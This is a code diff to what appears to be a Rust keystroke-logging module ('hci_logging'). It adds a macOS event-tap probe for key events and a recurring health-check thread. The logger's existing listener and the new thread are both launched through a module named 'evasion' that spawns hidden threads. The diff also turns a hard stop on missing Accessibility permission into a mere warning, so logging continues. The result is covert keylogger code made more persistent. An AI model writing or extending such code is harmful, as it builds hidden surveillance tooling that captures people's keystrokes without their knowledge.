@@ -99,6 +99,92 @@ lazy_static! {
     static ref WINDOW_POLLER_STARTED: AtomicBool = AtomicBool::new(false);
 }
 
+#[cfg(target_os = "macos")]
+lazy_static! {
+    /// macOS-only guard to avoid spawning duplicate periodic event-tap health
+    /// check threads across repeated start_logging() calls.
+    static ref TAP_HEALTH_CHECK_STARTED: AtomicBool = AtomicBool::new(false);
+}
+
+#[cfg(target_os = "macos")]
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum MacOsTapHealth {
+    /// Event tap could not be created (commonly missing Accessibility perms).
+    Unavailable,
+    /// Event tap object exists but is disabled.
+    Disabled,
+    /// Event tap exists and is enabled.
+    Enabled,
+}
+
+#[cfg(target_os = "macos")]
+fn probe_macos_event_tap_health() -> MacOsTapHealth {
+    use std::ffi::c_void;
+
+    type CGEventTapProxy = *mut c_void;
+    type CGEventType = u32;
+    type CGEventRef = *mut c_void;
+    type CFMachPortRef = *mut c_void;
+
+    extern "C" {
+        fn CGEventTapCreate(
+            tap: u32,
+            place: u32,
+            options: u32,
+            events_of_interest: u64,
+            callback: extern "C" fn(
+                CGEventTapProxy,
+                CGEventType,
+                CGEventRef,
+                *mut c_void,
+            ) -> CGEventRef,
+            user_info: *mut c_void,
+        ) -> CFMachPortRef;
+        fn CGEventTapIsEnabled(tap: CFMachPortRef) -> u8;
+        fn CFMachPortInvalidate(port: CFMachPortRef);
+        fn CFRelease(cf: *const c_void);
+    }
+
+    extern "C" fn passthrough_callback(
+        _proxy: CGEventTapProxy,
+        _event_type: CGEventType,
+        event: CGEventRef,
+        _user_info: *mut c_void,
+    ) -> CGEventRef {
+        event
+    }
+
+    // kCGSessionEventTap=1, kCGHeadInsertEventTap=0,
+    // kCGEventTapOptionListenOnly=1, keyDown(10)|keyUp(11).
+    let event_mask = (1u64 << 10) | (1u64 << 11);
+    let tap = unsafe {
+        CGEventTapCreate(
+            1,
+            0,
+            1,
+            event_mask,
+            passthrough_callback,
+            std::ptr::null_mut(),
+        )
+    };
+
+    if tap.is_null() {
+        return MacOsTapHealth::Unavailable;
+    }
+
+    let enabled = unsafe { CGEventTapIsEnabled(tap) != 0 };
+    unsafe {
+        CFMachPortInvalidate(tap);
+        CFRelease(tap as *const c_void);
+    }
+
+    if enabled {
+        MacOsTapHealth::Enabled
+    } else {
+        MacOsTapHealth::Disabled
+    }
+}
+
 fn check_consent() -> bool {
     let path = CONSENT_FILE_PATH.lock().unwrap();
     fs::metadata(path.as_str()).is_ok()
@@ -169,17 +255,33 @@ pub fn start_logging() -> Result<(), String> {
                 AXIsProcessTrusted()
             };
             if !trusted {
-                tracing::error!(
-                    "[hci-logging] macOS Accessibility permission not granted. \
-                     Keylogging requires the process to be added in \
-                     System Preferences \u{2192} Security & Privacy \u{2192} Accessibility. \
-                     Set HCI_LOGGING_CONSENT to acknowledge this requirement."
+                log::warn!(
+                    "hci_logging: macOS Accessibility permission is not granted. \
+                     Key events may not be captured until this process is added in \
+                     System Preferences -> Privacy & Security -> Accessibility."
                 );
-                LISTENER_STARTED.store(false, Ordering::SeqCst);
-                return Err(
-                    "macOS Accessibility permission not granted \u{2014} keylogging unavailable"
-                        .to_string(),
-                );
+            }
+
+            // Probe event-tap state up front to give operators actionable
+            // feedback when key capture is unavailable due to permissions.
+            match probe_macos_event_tap_health() {
+                MacOsTapHealth::Unavailable => {
+                    log::warn!(
+                        "hci_logging: macOS CGEventTap could not be created. \
+                         Grant Accessibility permissions to this process in \
+                         System Preferences -> Privacy & Security -> Accessibility \
+                         to enable keylogging."
+                    );
+                }
+                MacOsTapHealth::Disabled => {
+                    log::warn!(
+                        "hci_logging: macOS CGEventTap is not enabled. \
+                         Grant Accessibility permissions to this process in \
+                         System Preferences -> Privacy & Security -> Accessibility \
+                         to enable keylogging."
+                    );
+                }
+                MacOsTapHealth::Enabled => {}
             }
 
             crate::evasion::spawn_hidden_thread(move || {
@@ -206,6 +308,34 @@ pub fn start_logging() -> Result<(), String> {
                     LISTENER_STARTED.store(false, Ordering::SeqCst);
                 }
             });
+
+            // Periodic health check: CGEventTap can be disabled at runtime if
+            // Accessibility permissions are revoked while the process is alive.
+            if !TAP_HEALTH_CHECK_STARTED.swap(true, Ordering::SeqCst) {
+                crate::evasion::spawn_hidden_thread(move || {
+                    let mut warned_disabled = false;
+                    while LISTENER_STARTED.load(Ordering::Relaxed) {
+                        if IS_LOGGING.load(Ordering::Relaxed) {
+                            match probe_macos_event_tap_health() {
+                                MacOsTapHealth::Enabled => {
+                                    warned_disabled = false;
+                                }
+                                MacOsTapHealth::Unavailable | MacOsTapHealth::Disabled => {
+                                    if !warned_disabled {
+                                        log::warn!(
+                                            "hci_logging: macOS CGEventTap was disabled at runtime - \
+                                             Accessibility permissions may have been revoked."
+                                        );
+                                        warned_disabled = true;
+                                    }
+                                }
+                            }
+                        }
+                        thread::sleep(Duration::from_secs(60));
+                    }
+                    TAP_HEALTH_CHECK_STARTED.store(false, Ordering::SeqCst);
+                });
+            }
         }
 
         #[cfg(not(target_os = "macos"))]
